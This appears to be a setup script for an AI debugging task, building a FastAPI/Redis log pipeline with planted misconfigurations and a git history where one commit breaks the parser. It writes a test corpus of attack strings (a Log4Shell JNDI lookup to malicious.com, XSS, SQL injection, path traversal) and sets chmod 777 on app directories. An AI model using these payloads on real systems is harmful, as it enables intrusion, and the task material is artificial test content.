#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip redis-server git curl
    pip3 install pytest fastapi uvicorn redis setuptools

    # Create app directory and files
    mkdir -p /app

    cat << 'EOF' > /app/config.ini
[redis]
host = 127.0.0.1
port = 6380

[api]
port = 8080

[worker]
queue_name = wrong_queue
EOF

    cat << 'EOF' > /app/api.py
import configparser
import json
from fastapi import FastAPI, Request
import redis

config = configparser.ConfigParser()
config.read('/app/config.ini')

app = FastAPI()
r = redis.Redis(host=config['redis']['host'], port=int(config['redis']['port']))

@app.post("/ingest")
async def ingest(request: Request):
    data = await request.json()
    r.rpush('log_queue', json.dumps(data))
    return {"status": "ok"}
EOF

    cat << 'EOF' > /app/worker.py
import configparser
import json
import redis
import time
import sys

try:
    import parser as log_parser
except ImportError:
    pass

config = configparser.ConfigParser()
config.read('/app/config.ini')

r = redis.Redis(host=config['redis']['host'], port=int(config['redis']['port']))
queue_name = config['worker']['queue_name']

def run():
    while True:
        try:
            item = r.blpop(queue_name, timeout=1)
            if item:
                _, data = item
                parsed = log_parser.parse(data.decode('utf-8'))
                with open('/app/processed.log', 'a') as f:
                    f.write(json.dumps(parsed) + '\n')
        except Exception as e:
            time.sleep(1)

if __name__ == "__main__":
    run()
EOF

    cat << 'EOF' > /app/start_services.sh
#!/bin/bash
redis-server --daemonize yes
uvicorn api:app --host 0.0.0.0 --port 8080 --app-dir /app &
python3 /app/worker.py &
wait
EOF
    chmod +x /app/start_services.sh

    # Create Git repository
    mkdir -p /home/user/log_parser_repo
    cd /home/user/log_parser_repo
    git init
    git config user.email "test@example.com"
    git config user.name "Test User"

    cat << 'EOF' > setup.py
from setuptools import setup
setup(name='log_parser', version='0.1', py_modules=['parser'])
EOF

    cat << 'EOF' > parser.py
import json
def parse(log_str):
    try:
        return json.loads(log_str)
    except:
        return {"msg": log_str}
EOF

    git add setup.py parser.py
    git commit -m "Initial commit"

    for i in {2..6}; do
        echo "# comment $i" >> parser.py
        git commit -am "Commit $i"
    done

    cat << 'EOF' > parser.py
import non_existent_module
import json
def parse(log_str):
    return json.loads(log_str)
EOF
    git commit -am "Commit 7: refactor parser"

    for i in {8..10}; do
        echo "# comment $i" >> parser.py
        git commit -am "Commit $i"
    done

    # Install the buggy package globally so it's present
    pip3 install -e .

    # Create corpora
    mkdir -p /var/opt/verifier/clean
    mkdir -p /var/opt/verifier/evil

    echo '{"log": "valid json"}' > /var/opt/verifier/clean/1.log
    echo '{"log": "{\"nested\": \"json\"}"}' > /var/opt/verifier/clean/2.log
    echo '{"log": "base64encodedstuff"}' > /var/opt/verifier/clean/3.log

    echo '{"log": "${jndi:ldap://malicious.com/a}"}' > /var/opt/verifier/evil/1.log
    echo '{"log": "<script>alert(1)</script>"}' > /var/opt/verifier/evil/2.log
    echo '{"log": "UNION SELECT 1,2,3"}' > /var/opt/verifier/evil/3.log
    echo '{"log": "../../../etc/passwd"}' > /var/opt/verifier/evil/4.log

    useradd -m -s /bin/bash user || true
    chown -R user:user /app
    chmod -R 777 /app
    chmod -R 777 /home/user
